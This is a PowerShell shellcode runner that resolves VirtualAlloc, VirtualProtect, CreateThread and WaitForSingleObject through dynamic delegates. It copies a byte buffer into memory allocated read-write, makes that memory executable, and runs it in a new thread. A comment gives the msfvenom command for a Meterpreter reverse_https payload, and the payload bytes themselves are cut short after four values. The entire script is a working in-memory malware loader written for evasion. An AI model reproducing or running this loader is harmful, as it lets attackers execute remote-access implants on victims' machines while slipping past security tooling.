function Shellcode_Runner_Delegate {

$Kernel32 = @'
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr LoadLibraryA(string lpLibFileName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr VirtualAllocDelegate(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr CreateThreadDelegate(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate UInt32 WaitForSingleObjectDelegate(IntPtr hHandle, UInt32 dwMilliseconds);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate bool VirtualProtectDelegate(IntPtr lpAddress, UInt32 dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);
}
'@

Add-Type -TypeDefinition $Kernel32

# Load the kernel32.dll dynamically
$kernel32Handle = [Kernel32]::LoadLibraryA("kernel32.dll")

# Get function addresses dynamically
$pVirtualAlloc = [Kernel32]::GetProcAddress($kernel32Handle, "VirtualAlloc")
$pCreateThread = [Kernel32]::GetProcAddress($kernel32Handle, "CreateThread")
$pWaitForSingleObject = [Kernel32]::GetProcAddress($kernel32Handle, "WaitForSingleObject")
$pVirtualProtect = [Kernel32]::GetProcAddress($kernel32Handle, "VirtualProtect")

# Convert function pointers to delegates
$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pVirtualAlloc, [Kernel32+VirtualAllocDelegate])
$CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pCreateThread, [Kernel32+CreateThreadDelegate])
$WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pWaitForSingleObject, [Kernel32+WaitForSingleObjectDelegate])
$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pVirtualProtect, [Kernel32+VirtualProtectDelegate])

# msfvenom.bat -p windows/x64/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=7710 -f ps1 EXITFUNC=thread
[Byte[]] $buf = 0xfc,0x48,0x83,0xe
$Size = $buf.Length

# Step 1: Allocate memory with PAGE_READWRITE permissions
[IntPtr]$addr = $VirtualAlloc.Invoke([IntPtr]::Zero, $Size, 0x3000, 0x04)

# Step 2: Copy the shellcode to the allocated memory
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $Size)

# Step 3: Change memory protection to PAGE_EXECUTE_READ
$OldProtect = 0
$VirtualProtect.Invoke($addr, $Size, 0x20, [ref]$OldProtect)

# Step 4: Create a thread to execute the shellcode
$thandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)

# Step 5: Wait for the created thread to finish executing
$WaitForSingleObject.Invoke($thandle, [uint32]::MaxValue)
}

Shellcode_Runner_Delegate
